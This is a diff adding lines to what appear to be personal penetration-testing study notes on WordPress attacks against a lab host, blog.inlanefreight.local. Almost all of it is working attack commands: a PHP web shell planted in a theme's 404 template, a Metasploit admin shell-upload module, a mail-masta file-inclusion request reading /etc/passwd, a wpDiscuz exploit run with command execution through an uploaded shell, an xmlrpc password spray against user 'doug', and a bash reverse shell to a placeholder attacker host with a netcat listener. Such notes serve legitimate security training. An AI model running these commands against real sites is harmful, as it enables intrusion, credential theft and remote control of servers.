@@ -785,3 +785,19 @@ system($_GET[0]);
 add to edit them modify source  > update > located at /wp-content/themes/<theme name>
 curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 -https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
+-msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
+---------
+use way back machine
+https://github.com/tomnomnom/waybackurls
+------------
+Vulnerable Plugins - mail-masta
+curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+Vulnerable Plugins - wpDiscuz
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+In this example, we would want to make sure to clean up the uthsdkbywoxeebg-1629904090.8191.php file and once again list it as a testing artifact in the appendices of our report.
+wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
+
+inject code to template theme 404 template: exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
+listen from atk host : nc -nvlp port
+http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php
